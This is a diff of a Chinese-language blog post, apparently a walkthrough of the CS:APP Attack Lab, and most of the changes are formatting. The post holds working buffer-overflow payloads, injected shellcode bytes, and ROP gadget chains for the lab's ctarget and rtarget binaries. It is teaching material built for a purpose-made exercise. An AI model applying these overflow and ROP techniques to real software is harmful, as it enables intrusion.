@@ -16,12 +16,12 @@
   <meta name="author" content="Ye">
   <meta name="keywords" content="">
   
-    <meta name="description" content="Code Injection利用缓冲区溢出，攻击 ctarget。 1思路：找到 touch1 的起始地址，使得从 getbuf 返回时会将控制转移到 touch1。 disas getbuf 1sub    $0x28,%rsp   发现分配了40个字节的栈帧 只需要输入48个字符，前40个字节将 getbuf 的栈空间填满，后8个字节将返回值覆盖为 touch1 的地址。这样，在 getbuf">
+    <meta name="description" content="Code Injection利用缓冲区溢出，攻击 ctarget。 1思路：找到 touch1 的起始地址，使得从 getbuf 返回时会将控制转移到 touch1。 disas getbuf 1sub    $0x28,%rsp  发现分配了 40 个字节的栈帧 只需要输入 48 个字符，前 40 个字节将 getbuf 的栈空间填满，后 8 个字节将返回值覆盖为 touch1 的地址。这样，在">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Attack Lab">
 <meta property="og:url" content="https://sydcs.github.io/2023/12/18/Attack-Lab/index.html">
 <meta property="og:site_name" content="Ye&#39;s Blog">
-<meta property="og:description" content="Code Injection利用缓冲区溢出，攻击 ctarget。 1思路：找到 touch1 的起始地址，使得从 getbuf 返回时会将控制转移到 touch1。 disas getbuf 1sub    $0x28,%rsp   发现分配了40个字节的栈帧 只需要输入48个字符，前40个字节将 getbuf 的栈空间填满，后8个字节将返回值覆盖为 touch1 的地址。这样，在 getbuf">
+<meta property="og:description" content="Code Injection利用缓冲区溢出，攻击 ctarget。 1思路：找到 touch1 的起始地址，使得从 getbuf 返回时会将控制转移到 touch1。 disas getbuf 1sub    $0x28,%rsp  发现分配了 40 个字节的栈帧 只需要输入 48 个字符，前 40 个字节将 getbuf 的栈空间填满，后 8 个字节将返回值覆盖为 touch1 的地址。这样，在">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://sydcs.github.io/images/Attack-Lab/2.png">
 <meta property="og:image" content="https://sydcs.github.io/images/Attack-Lab/3.png">
@@ -38,7 +38,7 @@
 <meta property="og:image" content="https://sydcs.github.io/images/Attack-Lab/5_5.png">
 <meta property="og:image" content="https://sydcs.github.io/images/Attack-Lab/5.png">
 <meta property="article:published_time" content="2023-12-18T14:21:11.000Z">
-<meta property="article:modified_time" content="2023-12-20T04:27:40.842Z">
+<meta property="article:modified_time" content="2024-02-07T17:02:51.613Z">
 <meta property="article:author" content="Ye">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://sydcs.github.io/images/Attack-Lab/2.png">
@@ -359,7 +359,7 @@
               <p id="updated-time" class="note note-default" style="">
                 
                   
-                    Last updated on December 20, 2023
+                    Last updated on February 8, 2024
                   
                 
               </p>
@@ -370,9 +370,10 @@
                 <h1 id="Code-Injection"><a href="#Code-Injection" class="headerlink" title="Code Injection"></a>Code Injection</h1><p>利用<strong>缓冲区溢出</strong>，攻击 <code>ctarget</code>。</p>
 <h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p>思路：找到 <code>touch1</code> 的起始地址，使得从 <code>getbuf</code> 返回时会将控制转移到 <code>touch1</code>。</p>
 <p>disas getbuf</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asm">sub    $0x28,%rsp  <br></code></pre></td></tr></table></figure>
-<p>发现分配了40个字节的栈帧</p>
-<p>只需要输入48个字符，前40个字节将 <code>getbuf</code> 的栈空间填满，后8个字节将返回值覆盖为 <code>touch1</code> 的地址。这样，在 <code>getbuf</code> 执行 <code>retq</code> 指令时，程序就会跳转执行 <code>touch1</code> 函数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asm">sub    $0x28,%rsp<br></code></pre></td></tr></table></figure>
+
+<p>发现分配了 40 个字节的栈帧</p>
+<p>只需要输入 48 个字符，前 40 个字节将 <code>getbuf</code> 的栈空间填满，后 8 个字节将返回值覆盖为 <code>touch1</code> 的地址。这样，在 <code>getbuf</code> 执行 <code>retq</code> 指令时，程序就会跳转执行 <code>touch1</code> 函数。</p>
 <p>disas touch1<br>查到 <code>touch1</code> 代码地址为：0x4016ef</p>
 <p>写输入文件时，注意字节序为小端。</p>
 <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs txt">00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>ef 16 40 00 00 00 00 00<br></code></pre></td></tr></table></figure>
@@ -399,22 +400,23 @@
 
 <h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><p>第三关中，要传递字符串作为参数。</p>
 <p>调用 <code>touch3</code> 和 <code>hexmatch</code> 函数时，会将数据压入栈中，覆盖 <code>getbuf</code> 使用的缓冲区内存。为了避免被覆盖，应该把 cookie 字符串数据存在 <code>test</code> 的栈上。</p>
-<p><img src="/images/Attack-Lab/3.png" srcset="/img/loading.gif" lazyload><br>查看 <code>test</code> 分配栈帧后，%rsp 指向 0x55622c08。<br>（或者不用查看，根据2直接算：0x55622c08 &#x3D; 0x55622bd8 + 0x28 + 0x8）<br>这就是字符串要存放的地址，也是调用 <code>touch3</code> 时传入的参数。</p>
+<p><img src="/images/Attack-Lab/3.png" srcset="/img/loading.gif" lazyload><br>查看 <code>test</code> 分配栈帧后，%rsp 指向 0x55622c08。<br>（或者不用查看，根据 2 直接算：0x55622c08 &#x3D; 0x55622bd8 + 0x28 + 0x8）<br>这就是字符串要存放的地址，也是调用 <code>touch3</code> 时传入的参数。</p>
 <p>disas touch3<br>查到 <code>touch3</code> 代码地址为：0x4017ef</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm">movq    $0x55622c08, %rdi<br>pushq   $0x4017ef<br>ret<br></code></pre></td></tr></table></figure>
 
-<p>输入56个字节。开头40个字节放注入代码的字节表示，中间8个字节放注入代码的地址用来覆盖返回地址，最后8个字节放 cookie 的 ASCII 码。</p>
+<p>输入 56 个字节。开头 40 个字节放注入代码的字节表示，中间 8 个字节放注入代码的地址用来覆盖返回地址，最后 8 个字节放 cookie 的 ASCII 码。</p>
 <p>最终栈结构：<br><img src="/images/Attack-Lab/3_stack.png" srcset="/img/loading.gif" lazyload alt="来源 [CSAPP | Lab3-Attack Lab 深入解析 - 知乎](https://zhuanlan.zhihu.com/p/476396465)"></p>
 <p>cookie 值 0x704163d2 转 ASCII 为：37 30 34 31 36 33 64 32 00</p>
 <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs txt">48 c7 c7 08 2c 62 55 68<br>ef 17 40 00 c3 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>d8 2b 62 55 00 00 00 00<br>37 30 34 31 36 33 64 32<br>00<br></code></pre></td></tr></table></figure>
 
-<h1 id="Return-Oriented-Programming"><a href="#Return-Oriented-Programming" class="headerlink" title="Return-Oriented Programming"></a>Return-Oriented Programming</h1><p>攻击 <code>rtarget</code>：栈随机化 + 栈上代码不可执行，现在怎么办？<br>在已经存在的程序中找到特定的以 <code>ret</code> 结尾的指令序列为我们所用，把要用到部分的地址压入栈中，每次 <code>ret</code> 后又会取出下一个 gadget。这样就能形成一个程序链，实现攻击。<br>需要从 gadget farm 中，找出有用的 gadget，执行类似于上面第2关和第3关的攻击。</p>
+<h1 id="Return-Oriented-Programming"><a href="#Return-Oriented-Programming" class="headerlink" title="Return-Oriented Programming"></a>Return-Oriented Programming</h1><p>攻击 <code>rtarget</code>：栈随机化 + 栈上代码不可执行，现在怎么办？<br>在已经存在的程序中找到特定的以 <code>ret</code> 结尾的指令序列为我们所用，把要用到部分的地址压入栈中，每次 <code>ret</code> 后又会取出下一个 gadget。这样就能形成一个程序链，实现攻击。<br>需要从 gadget farm 中，找出有用的 gadget，执行类似于上面第 2 关和第 3 关的攻击。</p>
 <p><img src="/images/Attack-Lab/ROP.png" srcset="/img/loading.gif" lazyload alt="ROP"></p>
-<h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><p>重复2的攻击，也就是需要拼出下面的代码：</p>
+<h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><p>重复 2 的攻击，也就是需要拼出下面的代码：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm">movq    $0x704163d2, %rdi<br>pushq   $0x40171b<br>ret<br></code></pre></td></tr></table></figure>
 
 <p>将 cookie 放在栈上，再借助 gadget 里的 pop 指令，将存入的 cookie 弹出。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm"># gadget<br>popq %rdi # 5f<br>ret<br></code></pre></td></tr></table></figure>
+
 <p>但是，farm 中找不到 5f</p>
 <p>于是只能曲线救国，使用两个 gadget：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asm"># gadget 1<br>popq %rax # 58<br>ret<br># gadget 2<br>movq %rax, %rdi # 48 89 c7<br>ret<br></code></pre></td></tr></table></figure>
@@ -429,23 +431,24 @@
 <p>写入：</p>
 <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs txt">00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>85 18 40 00 00 00 00 00<br>d2 63 41 70 00 00 00 00<br>a6 18 40 00 00 00 00 00<br>1b 17 40 00 00 00 00 00<br></code></pre></td></tr></table></figure>
 
-<h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><p>重复3的攻击，即要求：最终，%rdi 存 cookie 地址，然后返回 <code>touch3</code>。</p>
-<p>区别在于，由于栈随机化，不再能像3中一样直接获取 cookie 字符串的地址。<br>解决方案：在代码中获取 %rsp 的地址，然后加上偏移量来确定 cookie 的地址。</p>
+<h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><p>重复 3 的攻击，即要求：最终，%rdi 存 cookie 地址，然后返回 <code>touch3</code>。</p>
+<p>区别在于，由于栈随机化，不再能像 3 中一样直接获取 cookie 字符串的地址。<br>解决方案：在代码中获取 %rsp 的地址，然后加上偏移量来确定 cookie 的地址。</p>
 <p>怎么加？发现有一个 add 的 gadget。<br><img src="/images/Attack-Lab/5_2.png" srcset="/img/loading.gif" lazyload><br>地址 4018b6</p>
 <p>查找 mov %rax, %rdi -48 89 c7 ：<br><img src="/images/Attack-Lab/5_6.png" srcset="/img/loading.gif" lazyload><br>地址 4018a6</p>
 <p>此前，需要把基址 %rsp 移到 %rdi，偏移量移到 %rsi。</p>
 <p>查找 mov %rsp , %___ - 48 89 e_：<br><img src="/images/Attack-Lab/5_1.png" srcset="/img/loading.gif" lazyload><br>48 89 e0 - <code>mov %rsp, %rax</code><br>地址 4018bd</p>
-<p>查找 <code>mov %rax, %rdi</code> - 48 89 c7:<br>同4，地址 4018a6</p>
+<p>查找 <code>mov %rax, %rdi</code> - 48 89 c7:<br>同 4，地址 4018a6</p>
 <p>现在已经有了基址，偏移量还需要从栈上弹出，然后一顿倒寄存器。</p>
-<p>查找 <code>popq %rax</code> - 58:<br>同4，地址 401885</p>
+<p>查找 <code>popq %rax</code> - 58:<br>同 4，地址 401885</p>
 <p>逆序查找，偏移量需要从 %rax 最终移到 %rsi。但是，farm 中并没有以 %rsi 为目标的 mov 指令。<br>于是只能改用低字节的 movl。</p>
 <p>查找 movl %___ , %esi:<br><img src="/images/Attack-Lab/5_3.png" srcset="/img/loading.gif" lazyload><br>89 d6 - <code>movl %edx, %esi</code><br>地址 401988</p>
 <p>查找 movl %___ , %edx:<br><img src="/images/Attack-Lab/5_4.png" srcset="/img/loading.gif" lazyload><br>这里，84 c0 是 testb，对结果没有影响<br>89 ca - <code>movl %ecx, %edx</code><br>地址 4018ca</p>
 <p>查找 movl %___ , %ecx:<br><img src="/images/Attack-Lab/5_5.png" srcset="/img/loading.gif" lazyload><br>这里，84 d2 是 testb，对结果没有影响<br>89 c1 - <code>movl %eax, %ecx</code><br>地址 4018c4</p>
 <hr>
 <p>最终栈结构：<br><img src="/images/Attack-Lab/5.png" srcset="/img/loading.gif" lazyload alt="来源 [CSAPP | Lab3-Attack Lab 深入解析 - 知乎](https://zhuanlan.zhihu.com/p/476396465)，具体寄存器并不对应"></p>
-<p>偏移量 8 * 10 - 8 &#x3D;  72 &#x3D; 0x48 （从 getbuf 返回时，%rsp 往上挪了一格）<br>写入：</p>
+<p>偏移量 8 * 10 - 8 &#x3D; 72 &#x3D; 0x48 （从 getbuf 返回时，%rsp 往上挪了一格）<br>写入：</p>
 <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs txt">00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>bd 18 40 00 00 00 00 00<br>a6 18 40 00 00 00 00 00<br>85 18 40 00 00 00 00 00<br>48 00 00 00 00 00 00 00<br>c4 18 40 00 00 00 00 00<br>ca 18 40 00 00 00 00 00<br>88 19 40 00 00 00 00 00<br>b6 18 40 00 00 00 00 00<br>a6 18 40 00 00 00 00 00<br>ef 17 40 00 00 00 00 00<br>37 30 34 31 36 33 64 32<br>00<br></code></pre></td></tr></table></figure>
+
                 
               </div>
             
